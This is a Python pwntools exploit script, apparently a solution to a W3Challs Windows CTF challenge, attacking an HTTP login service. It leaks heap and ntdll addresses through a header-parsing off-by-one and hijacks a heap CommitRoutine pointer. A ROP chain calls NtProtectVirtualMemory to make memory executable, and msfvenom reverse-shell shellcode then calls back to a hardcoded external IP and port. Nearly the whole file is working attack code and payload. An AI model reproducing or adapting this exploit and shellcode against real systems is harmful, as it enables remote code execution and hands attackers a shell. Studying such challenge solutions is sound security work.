#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

# debug with this in C:/Windows/System32/drivers/hosts:
# 172.16.62.1 win.local.w3challs.com

context.arch = 'amd64'

if len(sys.argv) < 3:
    print "Usage: %s <host> <port>"
    sys.exit(1)

HOST, PORT = sys.argv[1], int(sys.argv[2])
DEBUG = "debug" in sys.argv

_KUSER_SHARED_DATA = 0x7ffe0000
#l5 = listen(1337)
#
# HEAP LEAK ]--------------------------------------------------------------------

# idea: overlap params[username].value with headers** and realloc headers**
#       -> HeapFree(params[username].value) -> leak the freelist pointer

l1 = listen(12345)
r1 = remote(HOST, PORT)

# 'C' of 'C:\WINDOWS' in _KUSER_SHARED_DATA!NtSystemRoot
fake_headers = p64(_KUSER_SHARED_DATA + 0x30) * 6

payload  = "POST "
payload += "/login?domain=win.local.w3challs.com&password=" + "A" * 0x100 + "&username=" + urlencode(fake_headers)
payload += " HTTP/1.1\r\n"
payload += "X: " + "Y" * 0x30 + "\r\n"
payload += "X: " + "Y" * 0x50 + "\r\n"
payload += "A" * 0x40 + ": " + "B" * 0x40 + "\r\n"
payload += "Host: " + 'X' * 128 + "\r\n"           # trigger off-by-one on headers**
payload += "Z" * 0x40 + ": " + "B" * 0x40 + "\r\n" # HeapReAlloc(headers**) => HeapFree(params[username].value)
payload += "\r\n"

r1.send(payload)

heap_leak = u64(l1.readuntil("::", drop=True).ljust(8, "\x00"))
log.info("heap leak: %#x" % heap_leak)
heap_base = heap_leak - 0x3160
log.success("heap of thread 1 @ %#x" % heap_base)

# NTDLL LEAK + HeapKey LEAK ]----------------------------------------------------

# idea: overlap params** with headers** and realloc headers**
#       -> HeapFree(params**) -> overwrite the params** values with POST content

if DEBUG:
    time.sleep(2)

l2 = listen(12345)
r2 = remote(HOST, PORT)

fake_headers = flat(_KUSER_SHARED_DATA + 0x30) * 2

username_heap_thread_1 = heap_base + 0x2c80
log.info("  'username' in heap 1 @ %#x" % username_heap_thread_1)
ntdll_leak_addr = heap_base + 0x2c0
log.info("  ntdll pointer @ %#x" % ntdll_leak_addr)
password_heap_thread_1 = heap_base + 0x2ca0
log.info("  'password' in heap 1 @ %#x" % password_heap_thread_1)
CommitRoutine_mangled_addr = heap_base + 0x168
log.info("  CommitRoutine in heap 1 @ %#x" % CommitRoutine_mangled_addr)

content = "A=" + urlencode(flat(
    username_heap_thread_1, ntdll_leak_addr,
    password_heap_thread_1, CommitRoutine_mangled_addr,
    password_heap_thread_1, CommitRoutine_mangled_addr,
)) + "&domain=win.local.w3challs.com&" + "&" * 0x100

payload  = "POST "
payload += '/login?a=AAAAAAAAAAAAAAAA&password=' + 'A' * 0xa0 + '&username=BBBBBBBB&username=' + urlencode(fake_headers)
payload += " HTTP/1.1\r\n"
payload += "Host: " + 'X' * 128 + "\r\n"
payload += "username: Y\r\n"
payload += "X: Y\r\n"
payload += "Content-Length: " + str(len(content)) + "\r\n"
payload += "X: " + "Y" * 0x50 + "\r\n"
payload += "\r\n"
payload += content

r2.send(payload)

ntdll_leak = u64(l2.readuntil("::", drop=True).ljust(8, "\x00")) # ntdll!RtlpStaticDebugInfo+0x90
log.success("ntdll!RtlpStaticDebugInfo leak: %#x" % ntdll_leak)
ntdll_base = ntdll_leak - 0x163d10
log.success("NTDLL @ %#x" % ntdll_base)

RtlpHeapKey = u64(l2.read(9).rsplit("\n")[0].ljust(8, "\x00")) # CommitRoutine ^ RtlpHeapKey = 0
log.success("ntdll!RtlpHeapKey = %#x" % RtlpHeapKey)

# TARGET HEAP LEAK ]----------------------------------------------------

# idea: same as before but leak the heap associated to thread 4 from ntdll

if DEBUG:
    time.sleep(2)

l3 = listen(12345)
r3 = remote(HOST, PORT)
r4 = remote(HOST, PORT) # keep it inactive for the moment

fake_headers = flat(
    _KUSER_SHARED_DATA + 0x30, # key: 'C' of 'C:\WINDOWS' in _KUSER_SHARED_DATA!NtSystemRoot
    _KUSER_SHARED_DATA + 0x24, # value: non-null bytes
)

# threads in ntdll memory
#
# 00007ff8`92b33b80  00000205`3f7a0000 00000205`3f6e0000
# 00007ff8`92b33b90  00000205`3fa90000 00000205`3fa40000
# 00007ff8`92b33ba0  00000205`3f9f0000 00000205`3fbe0000
# 00007ff8`92b33bb0  00000205`3fb50000 00000000`00000000

thread4_addr_in_ntdll = ntdll_base + 0x163b80 + 6 * 8
log.info("  thread 4 addr stored in ntdll @ %#x" % thread4_addr_in_ntdll)
thread4_addr_in_ntdll += 2 # point after the 0000

content = "A=" + urlencode(flat(
    username_heap_thread_1, thread4_addr_in_ntdll,
    password_heap_thread_1, CommitRoutine_mangled_addr,
    password_heap_thread_1, CommitRoutine_mangled_addr,
)) + "&domain=win.local.w3challs.com&" + "&" * 0x100

payload = "POST "
payload += '/login?a=BBBBBBBBBBBBBBBB&password=' + 'A' * 0xa0 + '&username=BBBBBBBB&username=' + urlencode(fake_headers)
payload += " HTTP/1.1\r\n"
payload += "Host: " + 'X' * 128 + "\r\n"
payload += "username: Y\r\n"
payload += "password: Y\r\n"
payload += "Content-Length: " + str(len(content)) + "\r\n"
payload += "username: " + "Y" * 0x50 + "\r\n"
payload += "\r\n"

r3.send(payload)
r3.send(content)

target_heap = u64(l3.readuntil("::", drop=True).ljust(8, "\x00")) << 16 # inside ntdll!RtlpStaticDebugInfo
log.success("target_heap @ %#x" % target_heap)

# PWN ]----------------------------------------------------

if DEBUG:
    time.sleep(2)

l4 = listen(12345)
r5 = remote(HOST, PORT)

# leave ;
# mov rbx, qword [rsp+0x18] ;
# mov rax, rcx ;
# mov rbp, qword [rsp+0x20] ;
# mov rsi, qword [rsp+0x28] ;
# mov rdi, qword [rsp+0x30] ;
# pop r15 ;
# pop r14 ;
# ret  ;
pivot_gadget = ntdll_base + 0x010442e

content = "A"*0x30+"=" + urlencode(flat(
    username_heap_thread_1, target_heap + 0x18,
    password_heap_thread_1, target_heap + 0x168,
))
content += "&password=" + urlencode(p64(pivot_gadget ^ RtlpHeapKey))
content += "&username=" + urlencode(p64(ntdll_base + 0x0d26c4).strip('\x00')) # add rsp, 0x0000000000000CD0 ; pop rbx ; ret
content += "&domain=win.local.w3challs.com"
content += "&" * 0x100

payload = "POST "
payload += ('/login?a=AAAAAAAAAAAAAAAA&username=BBBBBBBB&username=' + urlencode(fake_headers)).ljust(0xf0, '&')
payload += " HTTP/1.1\r\n"
payload += "Host: " + 'X' * 128 + "\r\n"
payload += "username: Y\r\n"
payload += "Content-Length: " + str(len(content)) + "\r\n"
payload += "\r\n"
payload += content

r5.send(payload)
#raw_input("attach")

# PWN ]----------------------------------------------------

payload = "POST "
payload += ('/login?a=AAAAAAAAAAAAAAAA&username=BBBBBBBB&username=' + urlencode(fake_headers)).ljust(0xf0, '&')
payload += " HTTP/1.1\r\n"
payload += "Host: " + 'X' * 127 + "\r\n" # not overflowing
payload += "username: Y\r\n"
payload += "Content-Length: " + str(0x3000) + "\r\n" # large enough to trigger CommitRoutine
payload += "\r\n"
payload += "PAD" # align next on 8-bytes

# store NtProtectVirtualMemory parameters

NtProtectVirtualMemory_args = target_heap + 0xa10

payload += flat(
    0,           # OldAccessProtection
    0x5000,      # dwSize
    target_heap, # BaseAddress
)

payload += p64(ntdll_base + 0x0fe405) * 0x100 # ret

rw_addr = target_heap + 0x300

# NtProtectVirtualMemory(
#   IN HANDLE               ProcessHandle,
#   IN OUT PVOID            *BaseAddress,
#   IN OUT PULONG           NumberOfBytesToProtect,
#   IN ULONG                NewAccessProtection,
#   OUT PULONG              OldAccessProtection );

rop = flat(
    # call ntdll!NtProtectVirtualMemory

    ntdll_base + 0x08fb16,              # pop rdx ; pop r11 ; ret
    NtProtectVirtualMemory_args + 0x10, # pointer to BaseAddress
    "JUNKJUNK",                         # r11

    ntdll_base + 0x095189,              # pop rcx ; ret
    0xffffffffffffffff,                 # ProcessHandle

    ntdll_base + 0x08fb11,              # pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
    NtProtectVirtualMemory_args + 0x8,  # pointer to dwSize
    0x40,                               # flNewProtect => PAGE_EXECUTE_READWRITE
    "JUNKJUNK",                         # r10
    "JUNKJUNK",                         # r11

    ntdll_base + 0xa0050,               # NtProtectVirtualMemory

    # Jump to shellcode
    target_heap + 0x1400,

    p64(NtProtectVirtualMemory_args) * 5, # provide stack param
)

payload += rop
payload += "\x90" * 0x200 # nopesled

# msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=212.83.129.72 LPORT=1337 -f py -v shellcode

shellcode =  ""
shellcode += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
shellcode += "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
shellcode += "\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
shellcode += "\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
shellcode += "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
shellcode += "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
shellcode += "\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
shellcode += "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
shellcode += "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
shellcode += "\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
shellcode += "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
shellcode += "\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
shellcode += "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
shellcode += "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
shellcode += "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
shellcode += "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
shellcode += "\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
shellcode += "\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
shellcode += "\x49\xbc\x02\x00\x05\x39\xd4\x53\x81\x48\x41\x54"
shellcode += "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
shellcode += "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
shellcode += "\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
shellcode += "\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
shellcode += "\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
shellcode += "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
shellcode += "\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
shellcode += "\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
shellcode += "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
shellcode += "\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
shellcode += "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
shellcode += "\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
shellcode += "\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
shellcode += "\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
shellcode += "\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
shellcode += "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
shellcode += "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
shellcode += "\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
shellcode += "\x89\xda\xff\xd5"

payload += asm("add rsp, 0x2000")
payload += shellcode
payload += "\xcc"

r4.send(payload)

log.success('Spawning shell...')
r5.interactive()
